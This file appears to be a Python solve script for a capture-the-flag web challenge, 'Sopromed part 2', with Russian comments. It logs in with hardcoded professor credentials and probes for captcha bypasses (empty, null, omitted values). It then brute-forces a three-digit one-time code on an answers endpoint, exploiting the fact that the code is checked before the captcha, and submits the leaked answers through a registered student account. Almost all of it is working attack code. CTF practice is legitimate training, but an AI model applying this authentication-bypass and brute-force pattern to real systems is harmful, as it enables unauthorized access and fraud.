#!/usr/bin/env python3
"""Task4 — Sopromed part 2: unlock the "show answers" gate and pass the exam.

Механика замка (из клиентского бандла):
  - Gate:   GET  /api/teacher/tests/<id>/answers -> {test, site_key} | {code: twofa_required}
  - Reveal: POST /api/teacher/tests/<id>/answers {token, captcha}

Слабость — broken auth ordering: 3-значный OTP проверяется РАНЬШЕ captcha, поэтому
неверные коды отбиваются без валидации капчи и код (000..999) брутфорсится; валидный
reCAPTCHA-токен нужен лишь на одной успешной попытке.

Run::

    uv run task4/solve_task4.py [recaptcha_token]
"""

from __future__ import annotations

import json
import os
import sys
import time
from enum import Enum, auto
from pathlib import Path
from typing import TYPE_CHECKING, Any, cast

import requests

if TYPE_CHECKING:
    from collections.abc import Sequence

BASE = "https://sopromed-vlrdcf4v.avitoctf.ru"
PROF_USER = "prof_barsukov"
PROF_PASS = "b4dger_st34ls_h0ney"
TEST_ID = 1

# Гугловский тестовый ключ reCAPTCHA v2 — с ним siteverify всегда success.
GOOGLE_TEST_SITEKEY = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"
# Токен решённой капчи. Обычно подаётся аргументом / env CAPTCHA / task4/captcha.txt.
MANUAL_CAPTCHA: str | None = None
STUDENT_USER = "medoed_spy"
STUDENT_PASS = "SpyBadger_123!"

HTTP_OK = 200
HTTP_CREATED = 201
HTTP_BAD_REQUEST = 400
HTTP_CONFLICT = 409
HTTP_TOO_MANY = 429
BRUTE_MAX = 1000
PROGRESS_EVERY = 100
FLAG_MARKER = "avito{"


class _Omit(Enum):
    """Sentinel meaning: do not send the ``captcha`` field at all."""

    VALUE = auto()


OMIT = _Omit.VALUE
type Captcha = str | None | _Omit


def emit(message: str) -> None:
    """Write a single line to stdout (CLI output without ``print``)."""
    sys.stdout.write(message + "\n")


def load_captcha() -> str | None:
    """Return the reCAPTCHA token from argv, ``CAPTCHA`` env, ``captcha.txt``, or constant."""
    if len(sys.argv) > 1 and sys.argv[1].strip():
        return sys.argv[1].strip()
    env = os.environ.get("CAPTCHA", "").strip()
    if env:
        return env
    path = Path(__file__).resolve().parent / "captcha.txt"
    if path.exists():
        text = path.read_text(encoding="utf-8").strip()
        if text:
            return text
    return MANUAL_CAPTCHA


def jprint(label: str, obj: object) -> None:
    """Pretty-print a JSON-serialisable *obj* under *label* (truncated)."""
    emit(f"--- {label} ---")
    emit(json.dumps(obj, ensure_ascii=False, indent=2)[:4000])


def scan_for_flag(obj: object) -> str | None:
    """Return the ``avito{...}`` substring found anywhere in *obj*, or ``None``."""
    text = obj if isinstance(obj, str) else json.dumps(obj, ensure_ascii=False)
    start = text.find(FLAG_MARKER)
    if start < 0:
        return None
    return text[start : text.find("}", start) + 1]


def api(
    session: requests.Session,
    method: str,
    path: str,
    json_body: object | None = None,
) -> tuple[int, object]:
    """Send a request and return ``(status_code, parsed_json_or_text)``."""
    resp = session.request(method, BASE + path, timeout=30, json=cast("Any", json_body))
    try:
        body: object = resp.json()
    except ValueError:
        body = resp.text
    return resp.status_code, body


def login(session: requests.Session, user: str, password: str) -> tuple[bool, object]:
    """Log in and return ``(ok, body)``."""
    status, body = api(session, "POST", "/api/auth/login", {"username": user, "password": password})
    emit(f"[login] {user}: HTTP {status}")
    if status != HTTP_OK:
        jprint("login failed", body)
    return status == HTTP_OK, body


def register(session: requests.Session, user: str, password: str) -> tuple[bool, object]:
    """Register a new user (falling back to login if it already exists)."""
    body: object = None
    for payload in (
        {"username": user, "password": password, "full_name": "Medoed Spy"},
        {"username": user, "password": password},
    ):
        status, body = api(session, "POST", "/api/auth/register", payload)
        emit(f"[register] {user}: HTTP {status} ({list(payload)})")
        if status in (HTTP_OK, HTTP_CREATED):
            return True, body
        if status in (HTTP_BAD_REQUEST, HTTP_CONFLICT):
            ok, login_body = login(session, user, password)
            if ok:
                return True, login_body
    jprint("register failed", body)
    return False, body


def get_gate(session: requests.Session) -> tuple[int, object]:
    """Fetch the reveal gate (exposes ``site_key`` or ``twofa_required``)."""
    status, body = api(session, "GET", f"/api/teacher/tests/{TEST_ID}/answers")
    emit(f"[gate] GET answers: HTTP {status}")
    jprint("gate", body)
    return status, body


def reveal_any(session: requests.Session, token: str, captcha: Captcha) -> tuple[int, object]:
    """POST the reveal request; omit the ``captcha`` field when *captcha* is ``OMIT``."""
    payload: dict[str, str | None] = {"token": token}
    if captcha is not OMIT:
        payload["captcha"] = captcha
    return api(session, "POST", f"/api/teacher/tests/{TEST_ID}/answers", payload)


def probe(
    session: requests.Session, token: str, captcha: Captcha, label: str
) -> tuple[int, object]:
    """Send one reveal attempt and log its status and body (for diagnostics)."""
    status, body = reveal_any(session, token, captcha)
    short = body if isinstance(body, str) else json.dumps(body, ensure_ascii=False)
    emit(f"[probe] {label}: HTTP {status}  body={short[:300]}")
    return status, body


def looks_like_success(status: int, body: object) -> bool:
    """Return whether the reveal response looks like the unlocked answers."""
    if status != HTTP_OK:
        return False
    if isinstance(body, dict) and "answers" in body:
        return True
    return scan_for_flag(body) is not None


def is_captcha_error(body: object) -> bool:
    """Return whether the response body mentions a captcha rejection."""
    text = body if isinstance(body, str) else json.dumps(body, ensure_ascii=False)
    lowered = text.lower()
    return "captcha" in lowered or "капч" in lowered or "recaptcha" in lowered


def build_variants(site_key: object, manual_captcha: str | None) -> list[tuple[str, Captcha]]:
    """Build the ordered list of ``(name, captcha)`` variants to probe."""
    variants: list[tuple[str, Captcha]] = []
    if manual_captcha:
        variants.append(("manual", manual_captcha))
    if site_key == GOOGLE_TEST_SITEKEY:
        variants.append(("test-any", "test-bypass"))
    variants += [("empty", ""), ("dummy", "x"), ("omit", OMIT), ("null", None)]
    return variants


def find_accepted_captcha(
    session: requests.Session,
    variants: list[tuple[str, Captcha]],
) -> tuple[bool, Captcha, object | None]:
    """Probe ``token=000`` per variant; return ``(found, captcha, early_success_body)``."""
    for name, cap in variants:
        status, body = probe(session, "000", cap, f"captcha={name}")
        if looks_like_success(status, body):
            emit("[diag] success already at token=000")
            return False, None, body
        if not is_captcha_error(body):
            emit(f"[diag] variant '{name}' not rejected as captcha -> usable for brute")
            return True, cap, None
        time.sleep(0.1)
    return False, None, None


def brute_code(session: requests.Session, captcha: Captcha) -> object | None:
    """Brute the 3-digit OTP with an accepted captcha variant; return the body or ``None``."""
    emit("\n[brute] captcha passed -> trying token 000..999")
    for i in range(BRUTE_MAX):
        token = f"{i:03d}"
        status, body = reveal_any(session, token, captcha)
        if looks_like_success(status, body):
            emit(f"[brute] CODE FOUND: {token} (HTTP {status})")
            return body
        if status == HTTP_TOO_MANY:
            time.sleep(2.0)
        if is_captcha_error(body):
            emit(f"[brute] captcha rejected again at token={token} -> token single-use/expired")
            return None
        if i % PROGRESS_EVERY == 0:
            emit(f"[brute] ... {token}")
    emit("[brute] code not found in 000..999")
    return None


def solve_gate(
    session: requests.Session, site_key: object, manual_captcha: str | None
) -> object | None:
    """Unlock the gate; return the reveal-gate body (dict/list) or ``None``."""
    variants = build_variants(site_key, manual_captcha)
    emit("\n[diag] probing token=000 with captcha variants:")
    found, accepted, early = find_accepted_captcha(session, variants)
    if early is not None:
        return early
    if not found:
        emit("\n[diag] all captcha variants rejected -> real captcha enforced.")
        emit(
            "       solve it in the browser (grecaptcha.getResponse())"
            " and pass as arg / CAPTCHA env."
        )
        return None
    return brute_code(session, accepted)


def extract_answers(body: object) -> Sequence[object]:
    """Extract the ``[{position, answer}]`` list from the reveal-gate body."""
    if isinstance(body, dict):
        for key in ("answers", "items", "reveal"):
            value = body.get(key)
            if isinstance(value, list):
                return value
    if isinstance(body, list):
        return body
    return []


def build_submission(reveal_answers: Sequence[object], questions: object) -> dict[str, object]:
    """Map reference answers onto question ids (by position) for submission."""
    by_pos: dict[object, object] = {}
    for answer in reveal_answers:
        if isinstance(answer, dict):
            pos = answer.get("position")
            ans = answer.get("answer")
            if pos is not None and ans is not None:
                by_pos[pos] = ans

    answers: dict[str, object] = {}
    if isinstance(questions, list):
        for question in questions:
            if isinstance(question, dict):
                qid = question.get("id")
                if qid is not None:
                    answers[str(qid)] = by_pos.get(question.get("position"), "")
    return answers


def pass_exam(reveal_answers: Sequence[object]) -> None:
    """Register a student, submit the mapped answers, and print any resulting flag."""
    session = requests.Session()
    ok, _ = register(session, STUDENT_USER, STUDENT_PASS)
    if not ok:
        emit("[exam] could not register/login student — submit the answers manually")
        return

    status, test = api(session, "GET", f"/api/student/tests/{TEST_ID}")
    emit(f"[exam] GET student test: HTTP {status}")
    if status != HTTP_OK or not isinstance(test, dict):
        jprint("student test", test)
        return

    answers = build_submission(reveal_answers, test.get("questions"))
    jprint("submit payload", {"answers": answers})

    status, submission = api(
        session, "POST", f"/api/student/tests/{TEST_ID}/submit", {"answers": answers}
    )
    emit(f"[exam] submit: HTTP {status}")
    jprint("submission", submission)

    submission_id = submission.get("submission_id") if isinstance(submission, dict) else None
    if submission_id is None:
        return
    status, result = api(session, "GET", f"/api/student/submissions/{submission_id}")
    emit(f"[exam] submission view: HTTP {status}")
    jprint("result", result)
    flag = scan_for_flag(result) or scan_for_flag(submission)
    if flag:
        emit("=" * 50)
        emit(f"FLAG: {flag}")
        emit("=" * 50)


def main() -> None:
    """Log in as the professor, unlock the answers, and submit the exam."""
    teacher = requests.Session()
    ok, _ = login(teacher, PROF_USER, PROF_PASS)
    if not ok:
        sys.exit("could not log in as professor — check the password (task3)")

    _, gate = get_gate(teacher)
    site_key = gate.get("site_key") if isinstance(gate, dict) else None

    flag = scan_for_flag(gate)
    if flag:
        emit(f"FLAG (in gate): {flag}")

    manual = load_captcha()
    if manual:
        emit(f"[captcha] reCAPTCHA token loaded (len={len(manual)})")
    body = solve_gate(teacher, site_key, manual)
    if not body:
        sys.exit("gate not unlocked — see hints above (captcha/session)")

    emit("\n===== REFERENCE ANSWERS =====")
    reveal_answers = extract_answers(body)
    for answer in reveal_answers:
        if isinstance(answer, dict):
            emit(f"  #{answer.get('position')}: {answer.get('answer')}")
    flag = scan_for_flag(body)
    if flag:
        emit(f"FLAG (in answers): {flag}")

    emit("\n===== SUBMITTING EXAM =====")
    pass_exam(reveal_answers)


if __name__ == "__main__":
    main()
